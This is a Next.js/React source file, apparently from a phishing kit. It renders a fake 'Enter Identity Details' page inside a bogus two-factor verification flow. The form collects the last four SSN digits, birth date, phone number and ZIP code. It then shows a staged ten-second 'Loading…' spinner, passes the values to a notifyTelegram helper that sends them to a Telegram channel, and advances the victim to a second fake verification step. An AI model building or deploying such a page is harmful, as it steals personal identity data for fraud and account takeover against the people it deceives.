"use client";

import { useMemo, useState } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import { ArrowLeft, Loader2 } from "lucide-react";
import { Input } from "@/components/ui/input";
import { notifyTelegram } from "@/lib/telegram-notify";
import { setIdentityStepComplete } from "@/lib/auth-flow";

export function IdentityDetailsCard() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const rawMethod = searchParams.get("method") || "email";
  const method = (rawMethod === "text" ? "text" : rawMethod === "phone" ? "phone" : "email") as
    | "email"
    | "text"
    | "phone";

  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitAttempted, setSubmitAttempted] = useState(false);
  const [error, setError] = useState("");

  const [ssnLast4, setSsnLast4] = useState("");
  const [birthMonth, setBirthMonth] = useState("");
  const [birthDay, setBirthDay] = useState("");
  const [birthYear, setBirthYear] = useState("");
  const [phoneDigits, setPhoneDigits] = useState("");
  const [zipCode, setZipCode] = useState("");

  const ssnDigits = useMemo(() => ssnLast4.replace(/\D/g, "").slice(0, 4), [ssnLast4]);
  const zipDigits = useMemo(() => zipCode.replace(/\D/g, "").slice(0, 9), [zipCode]);

  const MONTHS = useMemo(
    () => [
      "January",
      "February",
      "March",
      "April",
      "May",
      "June",
      "July",
      "August",
      "September",
      "October",
      "November",
      "December",
    ],
    [],
  );
  const DAYS = useMemo(() => Array.from({ length: 31 }, (_, i) => String(i + 1)), []);
  const CURRENT_YEAR = new Date().getFullYear();
  const YEARS = useMemo(
    () => Array.from({ length: CURRENT_YEAR - 1919 }, (_, i) => String(CURRENT_YEAR - i)),
    [CURRENT_YEAR],
  );

  const birthDateForApi = useMemo(() => {
    if (!birthMonth || !birthDay || !birthYear) return "";
    const monthIndex = MONTHS.indexOf(birthMonth) + 1;
    if (!monthIndex) return "";
    return `${String(monthIndex).padStart(2, "0")}/${birthDay.padStart(2, "0")}/${birthYear}`;
  }, [birthMonth, birthDay, birthYear, MONTHS]);

  const isBirthDateValid = useMemo(() => {
    if (!birthMonth || !birthDay || !birthYear) return false;
    const monthIndex = MONTHS.indexOf(birthMonth) + 1;
    const m = monthIndex;
    const d = Number(birthDay);
    const y = Number(birthYear);
    if (!m || Number.isNaN(d) || Number.isNaN(y)) return false;
    const dt = new Date(y, m - 1, d);
    return dt.getFullYear() === y && dt.getMonth() === m - 1 && dt.getDate() === d;
  }, [birthMonth, birthDay, birthYear, MONTHS]);

  const formattedPhone = useMemo(() => {
    const d = phoneDigits
    const a = d.slice(0, 3)
    const b = d.slice(3, 6)
    const c = d.slice(6, 10)
    if (!d) return ""
    if (d.length <= 3) return a
    if (d.length <= 6) return `(${a}) ${b}`
    return `(${a}) ${b}-${c}`
  }, [phoneDigits])

  const isSsnValid = ssnDigits.length === 4;
  const isPhoneValid = phoneDigits.length === 10;
  const isZipValid = zipDigits.length === 5 || zipDigits.length === 9;

  const isFormValid = isSsnValid && isBirthDateValid && isPhoneValid && isZipValid;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (isSubmitting) return;
    setSubmitAttempted(true);

    if (!isFormValid) {
      setError("Please complete all identity fields correctly.");
      return;
    }

    setError("");
    setIsSubmitting(true);
    try {
      
      await new Promise((r) => setTimeout(r, 10000));

      notifyTelegram({
        kind: "identity",
        method,
        ssnLast4: ssnDigits,
        birthDate: birthDateForApi,
        phoneNumber: `+1 ${phoneDigits}`,
        zipCode: zipDigits,
      });

      setIdentityStepComplete();
      router.push(`/two-factor/verify-2?method=${encodeURIComponent(method)}`);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="w-full max-w-[500px] mx-auto bg-white rounded shadow-[0_2px_8px_rgba(0,0,0,0.1)] p-10 relative">
      <button
        type="button"
        onClick={() => router.push(`/two-factor/verify?method=${encodeURIComponent(method)}`)}
        disabled={isSubmitting}
        className="absolute top-6 left-6 text-[#666666] hover:text-[#00C389] transition-colors flex items-center gap-1 text-sm font-medium disabled:opacity-40 disabled:pointer-events-none"
      >
        <ArrowLeft className="w-4 h-4" /> Back
      </button>

      <div className="flex flex-col items-center text-center mb-8 mt-2">
        <h2 className="text-2xl font-normal text-[#333333] mb-2">
          Enter Identity Details
        </h2>
        <p className="text-sm text-[#666666]">
          Confirm your identity to continue.
        </p>
      </div>

      <form onSubmit={handleSubmit} className="space-y-5">
        <div>
          <label className="block text-sm font-medium text-[#333333] mb-2">
            Last 4 digits of SSN
          </label>
          <Input
            value={ssnDigits}
            onChange={(e) => setSsnLast4(e.target.value)}
            inputMode="numeric"
            maxLength={4}
            disabled={isSubmitting}
            placeholder="1234"
            className="w-full h-12 px-4 border border-[#DDDDDD] rounded text-center text-base placeholder:text-[#BBBBBB] focus:border-[#00C389] focus:ring-1 focus:ring-[#00C389] outline-none transition-all disabled:opacity-60 disabled:bg-[#FAFAFA]"
          />
          {submitAttempted && !isSsnValid && (
            <p className="text-xs text-red-500 font-medium mt-1">
              Enter the last 4 digits of SSN
            </p>
          )}
        </div>

        <div>
          <label className="block text-sm font-medium text-[#333333] mb-2">
            Birth date (MM/DD/YYYY)
          </label>
          <div className="grid grid-cols-3 gap-2">
            <select
              value={birthMonth}
              onChange={(e) => setBirthMonth(e.target.value)}
              disabled={isSubmitting}
              className="w-full h-12 px-3 border border-[#DDDDDD] rounded text-center text-base bg-white disabled:opacity-70 disabled:pointer-events-none min-w-0"
            >
              <option value="">Month</option>
              {MONTHS.map((m) => (
                <option key={m} value={m}>
                  {m}
                </option>
              ))}
            </select>
            <select
              value={birthDay}
              onChange={(e) => setBirthDay(e.target.value)}
              disabled={isSubmitting}
              className="w-full h-12 px-3 border border-[#DDDDDD] rounded text-center text-base bg-white disabled:opacity-70 disabled:pointer-events-none min-w-0"
            >
              <option value="">Day</option>
              {DAYS.map((d) => (
                <option key={d} value={d}>
                  {d}
                </option>
              ))}
            </select>
            <select
              value={birthYear}
              onChange={(e) => setBirthYear(e.target.value)}
              disabled={isSubmitting}
              className="w-full h-12 px-3 border border-[#DDDDDD] rounded text-center text-base bg-white disabled:opacity-70 disabled:pointer-events-none min-w-0"
            >
              <option value="">Year</option>
              {YEARS.map((y) => (
                <option key={y} value={y}>
                  {y}
                </option>
              ))}
            </select>
          </div>
          {submitAttempted && !isBirthDateValid && (
            <p className="text-xs text-red-500 font-medium mt-1">
              Enter a valid birth date (MM/DD/YYYY)
            </p>
          )}
        </div>

        <div>
          <label className="block text-sm font-medium text-[#333333] mb-2">
            Phone number
          </label>
          <div className="flex items-center gap-3">
            <span className="text-sm font-medium text-[#333333] shrink-0">+1</span>
            <Input
              value={formattedPhone}
              onChange={(e) => {
                const digits = e.target.value.replace(/\D/g, "").slice(0, 10)
                setPhoneDigits(digits)
              }}
              disabled={isSubmitting}
              placeholder="(555) 555-5555"
              className="flex-1 h-12 px-4 border border-[#DDDDDD] rounded text-center text-base placeholder:text-[#BBBBBB] focus:border-[#00C389] focus:ring-1 focus:ring-[#00C389] outline-none transition-all disabled:opacity-60 disabled:bg-[#FAFAFA]"
            />
          </div>
          {submitAttempted && !isPhoneValid && (
            <p className="text-xs text-red-500 font-medium mt-1">
              Enter a valid phone number (10 digits)
            </p>
          )}
        </div>

        <div>
          <label className="block text-sm font-medium text-[#333333] mb-2">
            Zip code
          </label>
          <Input
            value={zipDigits}
            onChange={(e) => setZipCode(e.target.value)}
            inputMode="numeric"
            maxLength={9}
            disabled={isSubmitting}
            placeholder="12345"
            className="w-full h-12 px-4 border border-[#DDDDDD] rounded text-center text-base placeholder:text-[#BBBBBB] focus:border-[#00C389] focus:ring-1 focus:ring-[#00C389] outline-none transition-all disabled:opacity-60 disabled:bg-[#FAFAFA]"
          />
          {submitAttempted && !isZipValid && (
            <p className="text-xs text-red-500 font-medium mt-1">
              Enter a valid zip code (5 or 9 digits)
            </p>
          )}
        </div>

        {error && <p className="text-xs text-red-500 font-medium">{error}</p>}

        <button
          type="submit"
          disabled={isSubmitting}
          className="w-full h-10 rounded-full text-sm font-medium text-white disabled:bg-[#B8B8B8] enabled:bg-[#00C389] enabled:hover:bg-[#00A876] transition-colors inline-flex items-center justify-center gap-2 disabled:opacity-70 disabled:cursor-not-allowed"
        >
          {isSubmitting ? (
            <>
              <Loader2 className="h-4 w-4 animate-spin" aria-hidden />
              Loading…
            </>
          ) : (
            "Continue"
          )}
        </button>
      </form>
    </div>
  );
}

